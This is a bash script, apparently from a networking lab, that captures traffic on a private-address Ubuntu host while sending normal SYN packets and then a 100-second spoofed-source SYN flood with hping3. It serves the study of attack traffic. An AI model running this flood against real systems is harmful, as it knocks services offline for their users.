#!/bin/bash

# Define variables
UBUNTU_IP="192.168.64.4"
PORT="8080"
PCAP_FILE="~/Desktop/Computer_Network/syn_flood.pcap"
DELAY_ATTACK=20      # Delay before launching SYN flood
ATTACK_DURATION=100  # How long SYN flood runs
DELAY_AFTER_ATTACK=20  # Wait time after attack before stopping everything

echo "[+] Starting packet capture on Ubuntu..."
ssh gaurav@$UBUNTU_IP "sudo tcpdump -i enp0s1 -w $PCAP_FILE" &

sleep 5  # Give time for SSH connection

echo "[+] Sending legitimate TCP traffic using hping3..."
hping3 -S -p $PORT -i u5000 $UBUNTU_IP > /dev/null 2>&1 &
HPING_LEGIT_PID=$!  # Store PID of legitimate traffic process

echo "[+] Waiting $DELAY_ATTACK seconds before launching SYN flood attack..."
sleep $DELAY_ATTACK

echo "[!!!] Launching SYN flood attack..."
sudo hping3 -S -p $PORT --flood --rand-source $UBUNTU_IP > /dev/null 2>&1 &
HPING_ATTACK_PID=$!  # Store PID of SYN flood attack

echo "[+] SYN flood attack running for $ATTACK_DURATION seconds..."
sleep $ATTACK_DURATION

echo "[!!!] Stopping SYN flood attack..."
sudo kill $HPING_ATTACK_PID  # Stop SYN flood

echo "[+] Waiting $DELAY_AFTER_ATTACK more seconds before stopping legitimate traffic..."
sleep $DELAY_AFTER_ATTACK
kill $HPING_LEGIT_PID  # Stop legitimate traffic

echo "[+] Stopping packet capture on Ubuntu..."
ssh gaurav@$UBUNTU_IP "sudo pkill -f 'tcpdump'"

echo "[+] Experiment complete. PCAP saved at: $PCAP_FILE"
